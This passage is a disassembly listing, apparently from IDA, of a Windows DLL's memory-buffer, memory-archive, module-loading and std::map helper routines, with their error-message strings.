		imul	eax, [ebp+var_20]
		and	ecx, [ebp+var_20]
		add	eax, ecx
		pop	ecx
		push	ecx		; flProtect
		push	1000h		; flAllocationType
		push	eax		; dwSize
		push	0		; lpAddress
		mov	[esi+8], eax
		mov	[esi+4], ecx
		call	ds:VirtualAlloc
		test	eax, eax
		mov	[esi+0Ch], eax
		jnz	short loc_6AF45322
		push	offset aCmemoryVirtual ; "CMemory::VirtualAlloc() : VirtualAlloc("...
		call	sub_6AF3102E
		and	dword ptr [esi+8], 0
		and	dword ptr [esi+4], 0
		pop	ecx

loc_6AF45322:				; CODE XREF: Ordinal872+5Cj
		mov	eax, [esi+0Ch]
		pop	esi
		leave
		retn	4
Ordinal872	endp

; Exported entry 875.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal875
Ordinal875	proc near		; CODE XREF: Ordinal873+DAp
					; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal874
		mov	eax, [esp+4+arg_0]
		mov	ecx, [eax+0Ch]
		mov	[esi+0Ch], ecx
		mov	ecx, [eax+8]
		mov	[esi+8], ecx
		mov	ecx, [eax+4]
		mov	[esi+4], ecx
		xor	ecx, ecx
		mov	[eax+0Ch], ecx
		mov	[eax+8], ecx
		mov	[eax+4], ecx
		xor	eax, eax
		inc	eax
		pop	esi
		retn	4
Ordinal875	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF4535A(void *, char)
sub_6AF4535A	proc near		; DATA XREF: .rdata:off_6AF5CAB4o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5CAB4
		call	Ordinal874
		test	[esp+4+arg_0], 1
		jz	short loc_6AF45376
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF45376:				; CODE XREF: sub_6AF4535A+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF4535A	endp

; Exported entry 869.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal869(int,	SIZE_T dwBytes)
		public Ordinal869
Ordinal869	proc near		; CODE XREF: Ordinal413+25p
					; Ordinal873+68p ...

arg_0		= dword	ptr  4
dwBytes		= dword	ptr  8

		mov	edx, [esp+arg_0]
		xor	eax, eax
		dec	edx
		dec	edx
		jz	short loc_6AF453A2
		dec	edx
		jz	short loc_6AF45397
		dec	edx
		jnz	short locret_6AF453AB
		push	[esp+dwBytes]
		call	Ordinal872
		jmp	short locret_6AF453AB
; ---------------------------------------------------------------------------

loc_6AF45397:				; CODE XREF: Ordinal869+Bj
		push	[esp+dwBytes]	; dwBytes
		call	Ordinal871
		jmp	short locret_6AF453AB
; ---------------------------------------------------------------------------

loc_6AF453A2:				; CODE XREF: Ordinal869+8j
		push	[esp+dwBytes]
		call	Ordinal870

locret_6AF453AB:			; CODE XREF: Ordinal869+Ej
					; Ordinal869+19j ...
		retn	8
Ordinal869	endp ; sp-analysis failed

; Exported entry 873.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal873
Ordinal873	proc near		; CODE XREF: Ordinal887+1Ap
					; DATA XREF: .rdata:off_6AF66098o

var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
Dst		= dword	ptr -4
dwBytes		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 10h
		push	ebx
		push	esi
		mov	esi, ecx
		xor	ebx, ebx
		cmp	[esi+0Ch], ebx
		jnz	short loc_6AF453D1
		push	offset aCmemoryRealloc ; "CMemory::ReAlloc() : m_pData == NULL\n"
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF4549E
; ---------------------------------------------------------------------------

loc_6AF453D1:				; CODE XREF: Ordinal873+Fj
		mov	edx, [ebp+dwBytes]
		cmp	[esi+8], edx
		jnz	short loc_6AF453EC
		push	offset aCmemoryReall_0 ; "CMemory::ReAlloc() : m_nSize == nSize\n"
		call	sub_6AF3101A
		mov	eax, [esi+0Ch]
		pop	ecx
		jmp	loc_6AF4549E
; ---------------------------------------------------------------------------

loc_6AF453EC:				; CODE XREF: Ordinal873+29j
		mov	eax, [esi+4]
		mov	ecx, eax
		dec	ecx
		dec	ecx
		push	edi		; Args
		jz	short loc_6AF45400
		dec	ecx
		jz	short loc_6AF4542C
		dec	ecx
		jnz	loc_6AF4549B

loc_6AF45400:				; CODE XREF: Ordinal873+46j
		push	edx		; dwBytes
		mov	edi, offset off_6AF5CAB4
		push	eax		; int
		lea	ecx, [ebp+var_10]
		mov	[ebp+var_10], edi
		mov	[ebp+var_C], ebx
		mov	[ebp+var_8], ebx
		mov	[ebp+Dst], ebx
		call	Ordinal869
		test	eax, eax
		jnz	short loc_6AF45468
		push	offset aCmemoryReall_1 ; "CMemory::ReAlloc() : mem.Alloc() == NUL"...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF45490
; ---------------------------------------------------------------------------

loc_6AF4542C:				; CODE XREF: Ordinal873+49j
		mov	edi, ds:GetProcessHeap
		push	edx		; dwBytes
		push	dword ptr [esi+0Ch] ; lpMem
		push	8		; dwFlags
		call	edi ; GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapReAlloc
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_6AF45454
		push	offset aCmemoryReall_2 ; "CMemory::ReAlloc() : mem.NewAlloc() == "...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF4549B
; ---------------------------------------------------------------------------

loc_6AF45454:				; CODE XREF: Ordinal873+97j
		push	ebx		; lpMem
		push	0		; dwFlags
		mov	[esi+0Ch], ebx
		call	edi ; GetProcessHeap
		push	eax		; hHeap
		call	ds:HeapSize
		mov	[esi+8], eax
		jmp	short loc_6AF4549B
; ---------------------------------------------------------------------------

loc_6AF45468:				; CODE XREF: Ordinal873+6Fj
		mov	eax, [esi+8]
		cmp	[ebp+var_8], eax
		jnb	short loc_6AF45473
		mov	eax, [ebp+var_8]

loc_6AF45473:				; CODE XREF: Ordinal873+C0j
		push	eax		; Size
		push	dword ptr [esi+0Ch] ; Src
		push	[ebp+Dst]	; Dst
		call	memcpy
		add	esp, 0Ch
		lea	eax, [ebp+var_10]
		push	eax
		mov	ecx, esi
		call	Ordinal875
		mov	ebx, [esi+0Ch]

loc_6AF45490:				; CODE XREF: Ordinal873+7Cj
		lea	ecx, [ebp+var_10]
		mov	[ebp+var_10], edi
		call	Ordinal874

loc_6AF4549B:				; CODE XREF: Ordinal873+4Cj
					; Ordinal873+A4j ...
		mov	eax, ebx
		pop	edi

loc_6AF4549E:				; CODE XREF: Ordinal873+1Ej
					; Ordinal873+39j
		pop	esi
		pop	ebx
		leave
		retn	4
Ordinal873	endp

; Exported entry 864.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal864
Ordinal864	proc near		; CODE XREF: Ordinal248+167p
					; Ordinal862+18p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		mov	esi, [esp+4+arg_0]
		push	edi
		mov	edi, ecx
		cmp	edi, esi
		jz	short loc_6AF454DC
		call	Ordinal874
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF454DC
		push	dword ptr [esi+8] ; dwBytes
		mov	ecx, edi
		push	eax		; int
		call	Ordinal869
		test	eax, eax
		jz	short loc_6AF454DC
		push	dword ptr [esi+8] ; Size
		push	dword ptr [esi+0Ch] ; Src
		push	dword ptr [edi+0Ch] ; Dst
		call	memcpy
		add	esp, 0Ch

loc_6AF454DC:				; CODE XREF: Ordinal864+Aj
					; Ordinal864+16j ...
		mov	eax, edi
		pop	edi
		pop	esi
		retn	4
Ordinal864	endp

; Exported entry 862.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal862
Ordinal862	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		xor	eax, eax
		mov	dword ptr [esi], offset	off_6AF5CAB4
		mov	[esi+4], eax
		mov	[esi+8], eax
		mov	[esi+0Ch], eax
		call	Ordinal864
		mov	eax, esi
		pop	esi
		retn	4
Ordinal862	endp

; Exported entry 881.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal881
Ordinal881	proc near		; CODE XREF: Ordinal291+26p
					; Ordinal292+28p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		push	[esp+8+arg_0]
		mov	esi, ecx
		call	Ordinal311
		lea	edi, [esi+18h]
		mov	ecx, edi
		call	Ordinal861
		and	dword ptr [esi+28h], 0
		mov	dword ptr [edi], offset	off_6AF5CC28
		pop	edi
		mov	dword ptr [esi], offset	off_6AF5CC18
		mov	eax, esi
		pop	esi
		retn	4
Ordinal881	endp

; Exported entry 882.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal882
Ordinal882	proc near		; CODE XREF: Ordinal291+64p
					; Ordinal292+66p ...
		push	esi
		mov	esi, ecx
		lea	ecx, [esi+18h]
		mov	dword ptr [esi], offset	off_6AF5CC18
		mov	dword ptr [ecx], offset	off_6AF5CC28
		call	Ordinal863
		mov	ecx, esi
		pop	esi
		jmp	Ordinal312
Ordinal882	endp

; Exported entry 883.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal883
Ordinal883	proc near		; DATA XREF: .rdata:off_6AF66098o
		and	dword ptr [ecx+28h], 0
		xor	eax, eax
		inc	eax
		retn
Ordinal883	endp

; Exported entry 884.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal884
Ordinal884	proc near		; DATA XREF: .rdata:off_6AF66098o
		mov	eax, [ecx+20h]
		mov	[ecx+28h], eax
		xor	eax, eax
		inc	eax
		retn
Ordinal884	endp

; Exported entry 886.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal886(void	*Dst, size_t Size)
		public Ordinal886
Ordinal886	proc near		; DATA XREF: .rdata:6AF5CC1Co
					; .rdata:off_6AF66098o

Dst		= dword	ptr  4
Size		= dword	ptr  8

		push	esi
		mov	esi, ecx
		mov	eax, [esi+28h]
		mov	ecx, [esi+20h]
		push	edi
		mov	edi, [esp+8+Size]
		sub	ecx, eax
		cmp	ecx, edi
		jnb	short loc_6AF45588
		push	offset aCmemoryarchive ; "CMemoryArchive::ReadEx() : m_nSize - m_"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF455A1
; ---------------------------------------------------------------------------

loc_6AF45588:				; CODE XREF: Ordinal886+12j
		mov	ecx, [esi+24h]
		push	edi		; Size
		add	ecx, eax
		push	ecx		; Src
		push	[esp+10h+Dst]	; Dst
		call	memcpy
		add	[esi+28h], edi
		xor	eax, eax
		add	esp, 0Ch
		inc	eax

loc_6AF455A1:				; CODE XREF: Ordinal886+21j
		pop	edi
		pop	esi
		retn	8
Ordinal886	endp

; Exported entry 887.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal887(void	*Src, size_t Size)
		public Ordinal887
Ordinal887	proc near		; DATA XREF: .rdata:6AF5CC20o
					; .rdata:off_6AF66098o

Src		= dword	ptr  4
Size		= dword	ptr  8

		push	esi
		mov	esi, ecx
		mov	eax, [esi+20h]
		mov	ecx, eax
		sub	ecx, [esi+28h]
		push	edi
		mov	edi, [esp+8+Size]
		cmp	ecx, edi
		jnb	short loc_6AF455D8
		add	eax, edi
		push	eax
		lea	ecx, [esi+18h]
		call	Ordinal873
		test	eax, eax
		jnz	short loc_6AF455D8
		push	offset aCmemoryarchi_0 ; "CMemoryArchive::WriteEx() : ReAlloc()	="...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF455F2
; ---------------------------------------------------------------------------

loc_6AF455D8:				; CODE XREF: Ordinal887+12j
					; Ordinal887+21j
		mov	eax, [esi+24h]
		add	eax, [esi+28h]
		push	edi		; Size
		push	[esp+0Ch+Src]	; Src
		push	eax		; Dst
		call	memcpy
		add	[esi+28h], edi
		xor	eax, eax
		add	esp, 0Ch
		inc	eax

loc_6AF455F2:				; CODE XREF: Ordinal887+30j
		pop	edi
		pop	esi
		retn	8
Ordinal887	endp

; Exported entry 888.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal888
Ordinal888	proc near		; DATA XREF: .rdata:6AF5CC24o
					; .rdata:off_6AF66098o

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		mov	eax, [ecx+20h]
		push	esi
		mov	esi, [esp+4+arg_4]
		xor	edx, edx
		cmp	esi, edx
		mov	edx, [esp+4+arg_0]
		pop	esi
		jb	short loc_6AF4561F
		ja	short loc_6AF45610
		cmp	edx, eax
		jb	short loc_6AF4561F

loc_6AF45610:				; CODE XREF: Ordinal888+13j
		push	offset aCmemoryarchi_1 ; "CMemoryArchive::SetPosEx() : uPos >= m_"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short locret_6AF45625
; ---------------------------------------------------------------------------

loc_6AF4561F:				; CODE XREF: Ordinal888+11j
					; Ordinal888+17j
		xor	eax, eax
		mov	[ecx+28h], edx
		inc	eax

locret_6AF45625:			; CODE XREF: Ordinal888+26j
		retn	8
Ordinal888	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF45628	proc near		; DATA XREF: .rdata:off_6AF5CC28o
		sub	ecx, 18h
		jmp	$+5
sub_6AF45628	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF45630(void *, char)
sub_6AF45630	proc near		; DATA XREF: .rdata:off_6AF5CC18o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal882
		test	[esp+4+arg_0], 1
		jz	short loc_6AF45646
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF45646:				; CODE XREF: sub_6AF45630+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF45630	endp

; Exported entry 889.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal889
Ordinal889	proc near		; CODE XREF: Ordinal626+3p
					; Ordinal846+3p ...
		mov	eax, ecx
		and	dword ptr [eax+4], 0
		mov	dword ptr [eax], offset	off_6AF5CCC8
		retn
Ordinal889	endp

; Exported entry 898.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal898
Ordinal898	proc near		; CODE XREF: Ordinal627+Dp
					; Ordinal632+7p ...
		push	esi
		mov	esi, ecx
		mov	eax, [esi+4]
		test	eax, eax
		jz	short loc_6AF4566E
		push	eax		; hLibModule
		call	ds:FreeLibrary
		and	dword ptr [esi+4], 0

loc_6AF4566E:				; CODE XREF: Ordinal898+8j
		pop	esi
		retn
Ordinal898	endp

; Exported entry 891.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal891
Ordinal891	proc near		; CODE XREF: Ordinal627+15j
					; Ordinal847+6j ...
		mov	dword ptr [ecx], offset	off_6AF5CCC8
		jmp	Ordinal898
Ordinal891	endp

; Exported entry 894.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal894
Ordinal894	proc near		; CODE XREF: Ordinal890+11p
					; Ordinal892+7p
					; DATA XREF: ...

arg_0		= dword	ptr  4

		push	esi
		push	edi
		mov	edi, [esp+8+arg_0]
		test	edi, edi
		mov	esi, ecx
		jnz	short loc_6AF45696
		push	offset aCmoduleAttachH ; "CModule::Attach() : hModule == NULL\n"
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	short loc_6AF456A3
; ---------------------------------------------------------------------------

loc_6AF45696:				; CODE XREF: Ordinal894+Aj
		mov	ecx, esi
		call	Ordinal898
		xor	eax, eax
		mov	[esi+4], edi
		inc	eax

loc_6AF456A3:				; CODE XREF: Ordinal894+19j
		pop	edi
		pop	esi
		retn	4
Ordinal894	endp

; Exported entry 895.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal895
Ordinal895	proc near		; DATA XREF: .rdata:off_6AF66098o
		push	esi
		mov	esi, [ecx+4]
		and	dword ptr [ecx+4], 0
		call	Ordinal898
		mov	eax, esi
		pop	esi
		retn
Ordinal895	endp

; Exported entry 896.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal896(LPCSTR Args)
		public Ordinal896
Ordinal896	proc near		; CODE XREF: Ordinal628+7p
					; Ordinal1062+7p ...

Args		= dword	ptr  4

		push	esi
		mov	esi, ecx
		call	Ordinal898
		push	[esp+4+Args]	; lpLibFileName
		call	ds:LoadLibraryA
		test	eax, eax
		mov	[esi+4], eax
		pop	esi
		jnz	short loc_6AF456EF
		call	ds:GetLastError
		push	eax
		push	[esp+4+Args]	; Args
		push	offset aCmoduleLoadLoa ; "CModule::Load() : LoadLibrary() == NULL"...
		call	sub_6AF3102E
		add	esp, 0Ch
		xor	eax, eax
		jmp	short locret_6AF456F2
; ---------------------------------------------------------------------------

loc_6AF456EF:				; CODE XREF: Ordinal896+18j
		xor	eax, eax
		inc	eax

locret_6AF456F2:			; CODE XREF: Ordinal896+34j
		retn	4
Ordinal896	endp

; Exported entry 897.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal897(LPCSTR Args,	DWORD dwFlags)
		public Ordinal897
Ordinal897	proc near		; CODE XREF: Ordinal629+Bp
					; Ordinal849+Bp ...

Args		= dword	ptr  4
dwFlags		= dword	ptr  8

		push	esi
		mov	esi, ecx
		call	Ordinal898
		push	[esp+4+dwFlags]	; dwFlags
		push	0		; hFile
		push	[esp+0Ch+Args]	; lpLibFileName
		call	ds:LoadLibraryExA
		test	eax, eax
		mov	[esi+4], eax
		pop	esi
		jnz	short loc_6AF45731
		call	ds:GetLastError
		push	eax
		push	[esp+4+Args]	; Args
		push	offset aCmoduleLoadL_0 ; "CModule::Load() : LoadLibraryEx() == NU"...
		call	sub_6AF3102E
		add	esp, 0Ch
		xor	eax, eax
		jmp	short locret_6AF45734
; ---------------------------------------------------------------------------

loc_6AF45731:				; CODE XREF: Ordinal897+1Ej
		xor	eax, eax
		inc	eax

locret_6AF45734:			; CODE XREF: Ordinal897+3Aj
		retn	8
Ordinal897	endp

; Exported entry 899.

; =============== S U B	R O U T	I N E =======================================


; int __stdcall	Ordinal899(LPCSTR Args)
		public Ordinal899
Ordinal899	proc near		; CODE XREF: Ordinal631+2Bp
					; Ordinal628+2Ap ...

Args		= dword	ptr  4

		push	esi
		push	[esp+4+Args]	; lpProcName
		push	dword ptr [ecx+4] ; hModule
		call	ds:GetProcAddress
		mov	esi, eax
		test	esi, esi
		jnz	short loc_6AF45763
		call	ds:GetLastError
		push	eax
		push	[esp+8+Args]	; Args
		push	offset aCmoduleGetproc ; "CModule::GetProc() : GetProcAddress()	="...
		call	sub_6AF3102E
		add	esp, 0Ch

loc_6AF45763:				; CODE XREF: Ordinal899+12j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal899	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_6AF45769(void *, char)
sub_6AF45769	proc near		; DATA XREF: .rdata:off_6AF5CCC8o

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		mov	dword ptr [esi], offset	off_6AF5CCC8
		call	Ordinal898
		test	[esp+4+arg_0], 1
		jz	short loc_6AF45785
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_6AF45785:				; CODE XREF: sub_6AF45769+13j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF45769	endp

; Exported entry 890.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal890
Ordinal890	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		and	dword ptr [esi+4], 0
		mov	dword ptr [esi], offset	off_6AF5CCC8
		call	Ordinal894
		test	eax, eax
		jnz	short loc_6AF457B0
		push	offset aCmoduleCmodule ; "CModule::CModule() : Attach()	== FALSE\n"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF457B0:				; CODE XREF: Ordinal890+18j
		mov	eax, esi
		pop	esi
		retn	4
Ordinal890	endp

; Exported entry 892.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal892
Ordinal892	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	Ordinal894
		test	eax, eax
		jnz	short loc_6AF457D1
		push	offset aCmoduleOperato ; "CModule::operator =()	: Attach() == FAL"...
		call	sub_6AF3102E
		pop	ecx

loc_6AF457D1:				; CODE XREF: Ordinal892+Ej
		mov	eax, esi
		pop	esi
		retn	4
Ordinal892	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF457D7	proc near		; CODE XREF: sub_6AF458CC+23p

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= byte ptr  18h

		push	ebp
		mov	ebp, esp
		mov	eax, ecx
		mov	ecx, [ebp+arg_0]
		mov	[eax], ecx
		mov	ecx, [ebp+arg_4]
		mov	[eax+4], ecx
		mov	ecx, [ebp+arg_8]
		mov	[eax+8], ecx
		mov	ecx, [ebp+arg_C]
		mov	edx, [ecx]
		mov	[eax+0Ch], edx
		mov	ecx, [ecx+4]
		mov	[eax+10h], ecx
		mov	cl, [ebp+arg_10]
		mov	[eax+14h], cl
		mov	byte ptr [eax+15h], 0
		pop	ebp
		retn	14h
sub_6AF457D7	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF45809	proc near		; CODE XREF: sub_6AF31CCD+E2p
					; sub_6AF31CCD+134p ...

arg_0		= dword	ptr  4

		mov	edx, [esp+arg_0]
		mov	eax, [edx+8]
		push	esi
		mov	esi, [eax]
		mov	[edx+8], esi
		mov	esi, [eax]
		cmp	byte ptr [esi+15h], 0
		jnz	short loc_6AF45821
		mov	[esi+4], edx

loc_6AF45821:				; CODE XREF: sub_6AF45809+13j
		mov	esi, [edx+4]
		mov	[eax+4], esi
		mov	ecx, [ecx+4]
		cmp	edx, [ecx+4]
		pop	esi
		jnz	short loc_6AF45835
		mov	[ecx+4], eax
		jmp	short loc_6AF45843
; ---------------------------------------------------------------------------

loc_6AF45835:				; CODE XREF: sub_6AF45809+25j
		mov	ecx, [edx+4]
		cmp	edx, [ecx]
		jnz	short loc_6AF45840
		mov	[ecx], eax
		jmp	short loc_6AF45843
; ---------------------------------------------------------------------------

loc_6AF45840:				; CODE XREF: sub_6AF45809+31j
		mov	[ecx+8], eax

loc_6AF45843:				; CODE XREF: sub_6AF45809+2Aj
					; sub_6AF45809+35j
		mov	[eax], edx
		mov	[edx+4], eax
		retn	4
sub_6AF45809	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF4584B	proc near		; CODE XREF: sub_6AF45B81+Cp
					; sub_6AF46067+Dp

arg_0		= dword	ptr  4

		mov	eax, [ecx+4]
		mov	ecx, [eax+4]
		cmp	byte ptr [ecx+15h], 0
		jnz	short locret_6AF45871
		mov	edx, [esp+arg_0]
		mov	edx, [edx]

loc_6AF4585D:				; CODE XREF: sub_6AF4584B+24j
		cmp	[ecx+0Ch], edx
		jnb	short loc_6AF45867
		mov	ecx, [ecx+8]
		jmp	short loc_6AF4586B
; ---------------------------------------------------------------------------

loc_6AF45867:				; CODE XREF: sub_6AF4584B+15j
		mov	eax, ecx
		mov	ecx, [ecx]

loc_6AF4586B:				; CODE XREF: sub_6AF4584B+1Aj
		cmp	byte ptr [ecx+15h], 0
		jz	short loc_6AF4585D

locret_6AF45871:			; CODE XREF: sub_6AF4584B+Aj
		retn	4
sub_6AF4584B	endp


; =============== S U B	R O U T	I N E =======================================


; int __stdcall	sub_6AF45874(void *)
sub_6AF45874	proc near		; CODE XREF: sub_6AF45874+16p
					; sub_6AF458A6+Cp

arg_0		= dword	ptr  4

		push	ebx
		push	esi
		push	edi
		mov	edi, [esp+0Ch+arg_0]
		cmp	byte ptr [edi+15h], 0
		mov	ebx, ecx
		mov	esi, edi
		jnz	short loc_6AF458A0

loc_6AF45885:				; CODE XREF: sub_6AF45874+2Aj
		push	dword ptr [esi+8] ; void *
		mov	ecx, ebx
		call	sub_6AF45874
		mov	esi, [esi]
		push	edi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		cmp	byte ptr [esi+15h], 0
		pop	ecx
		mov	edi, esi
		jz	short loc_6AF45885

loc_6AF458A0:				; CODE XREF: sub_6AF45874+Fj
		pop	edi
		pop	esi
		pop	ebx
		retn	4
sub_6AF45874	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF458A6	proc near		; CODE XREF: sub_6AF45BBB+18p
		push	esi
		push	edi
		mov	edi, ecx
		lea	esi, [edi+4]
		mov	eax, [esi]
		push	dword ptr [eax+4] ; void *
		call	sub_6AF45874
		mov	eax, [esi]
		mov	[eax+4], eax
		mov	eax, [esi]
		and	dword ptr [edi+8], 0
		mov	[eax], eax
		mov	esi, [esi]
		pop	edi
		mov	[esi+8], esi
		pop	esi
		retn
sub_6AF458A6	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF458CC	proc near		; CODE XREF: sub_6AF45C33+5Ep

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
arg_C		= dword	ptr  14h
arg_10		= dword	ptr  18h

		push	ebp
		mov	ebp, esp
		push	esi
		push	18h		; Size
		call	??2@YAPAXI@Z	; operator new(uint)
		mov	esi, eax
		test	esi, esi
		pop	ecx
		jz	short loc_6AF458F4
		push	[ebp+arg_10]
		mov	ecx, esi
		push	[ebp+arg_C]
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	sub_6AF457D7

loc_6AF458F4:				; CODE XREF: sub_6AF458CC+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	14h
sub_6AF458CC	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_6AF458FB(int, void *)
sub_6AF458FB	proc near		; CODE XREF: sub_6AF45BBB+3Bp
					; Ordinal904+5Ep

var_54		= dword	ptr -54h
var_2C		= byte ptr -2Ch
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		mov	eax, offset unknown_libname_90 ; Microsoft VisualC 2-10/net runtime
		call	__EH_prolog
		sub	esp, 48h
		push	ebx
		mov	ebx, [ebp+arg_4]
		cmp	byte ptr [ebx+15h], 0
		push	esi
		push	edi
		mov	[ebp+var_10], ecx
		jz	short loc_6AF4594A
		push	offset aInvalidMapSetT ; "invalid map/set<T> iterator"
		lea	ecx, [ebp+var_2C]
		call	ds:??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QAE@PBD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char>>::basic_string<char,std::char_traits<char>,std::allocator<char>>(char	const *)
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_2C]
		push	eax
		lea	ecx, [ebp+var_54]
		call	sub_6AF3136A
		push	offset dword_6AF61F1C
		lea	eax, [ebp+var_54]
		push	eax
		mov	[ebp+var_54], offset off_6AF548A0
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF4594A:				; CODE XREF: sub_6AF458FB+1Aj
		lea	ecx, [ebp+arg_4]
		call	sub_6AF31681
		mov	ecx, [ebx]
		cmp	byte ptr [ecx+15h], 0
		jz	short loc_6AF4595F
		mov	edi, [ebx+8]
		jmp	short loc_6AF45976
; ---------------------------------------------------------------------------

loc_6AF4595F:				; CODE XREF: sub_6AF458FB+5Dj
		mov	eax, [ebx+8]
		cmp	byte ptr [eax+15h], 0
		jz	short loc_6AF4596C
		mov	edi, ecx
		jmp	short loc_6AF45976
; ---------------------------------------------------------------------------

loc_6AF4596C:				; CODE XREF: sub_6AF458FB+6Bj
		mov	eax, [ebp+arg_4]
		cmp	eax, ebx
		mov	edi, [eax+8]
		jnz	short loc_6AF459EC

loc_6AF45976:				; CODE XREF: sub_6AF458FB+62j
					; sub_6AF458FB+6Fj
		cmp	byte ptr [edi+15h], 0
		mov	esi, [ebx+4]
		jnz	short loc_6AF45982
		mov	[edi+4], esi

loc_6AF45982:				; CODE XREF: sub_6AF458FB+82j
		mov	ecx, [ebp+var_10]
		mov	eax, [ecx+4]
		cmp	[eax+4], ebx
		jnz	short loc_6AF45992
		mov	[eax+4], edi
		jmp	short loc_6AF4599D
; ---------------------------------------------------------------------------

loc_6AF45992:				; CODE XREF: sub_6AF458FB+90j
		cmp	[esi], ebx
		jnz	short loc_6AF4599A
		mov	[esi], edi
		jmp	short loc_6AF4599D
; ---------------------------------------------------------------------------

loc_6AF4599A:				; CODE XREF: sub_6AF458FB+99j
		mov	[esi+8], edi

loc_6AF4599D:				; CODE XREF: sub_6AF458FB+95j
					; sub_6AF458FB+9Dj
		mov	ecx, [ecx+4]
		cmp	[ecx], ebx
		jnz	short loc_6AF459C0
		cmp	byte ptr [edi+15h], 0
		jz	short loc_6AF459AE
		mov	edx, esi
		jmp	short loc_6AF459BE
; ---------------------------------------------------------------------------

loc_6AF459AE:				; CODE XREF: sub_6AF458FB+ADj
		mov	eax, [edi]
		mov	edx, edi
		jmp	short loc_6AF459B8
; ---------------------------------------------------------------------------

loc_6AF459B4:				; CODE XREF: sub_6AF458FB+C1j
		mov	edx, eax
		mov	eax, [edx]

loc_6AF459B8:				; CODE XREF: sub_6AF458FB+B7j
		cmp	byte ptr [eax+15h], 0
		jz	short loc_6AF459B4

loc_6AF459BE:				; CODE XREF: sub_6AF458FB+B1j
		mov	[ecx], edx

loc_6AF459C0:				; CODE XREF: sub_6AF458FB+A7j
		mov	eax, [ebp+var_10]
		mov	ecx, [eax+4]
